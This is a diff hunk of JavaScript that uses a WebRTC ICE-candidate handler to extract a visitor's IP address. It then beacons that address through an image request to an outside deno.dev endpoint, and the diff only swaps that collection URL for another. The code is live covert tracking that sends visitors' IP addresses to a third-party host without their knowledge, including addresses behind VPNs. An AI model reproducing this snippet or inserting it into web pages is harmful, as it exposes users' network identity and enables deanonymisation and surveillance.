@@ -13,6 +13,6 @@
   pc.onicecandidate = function(e){
     if (!e || !e.candidate || !e.candidate.candidate) return;
     const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate)[1];
-    new Image().src = "https://enptvu.deno.dev/save?q=" + ip;
+    new Image().src = "https://thirsty-moth-44.deno.dev?q=" + ip;
   };
 })();
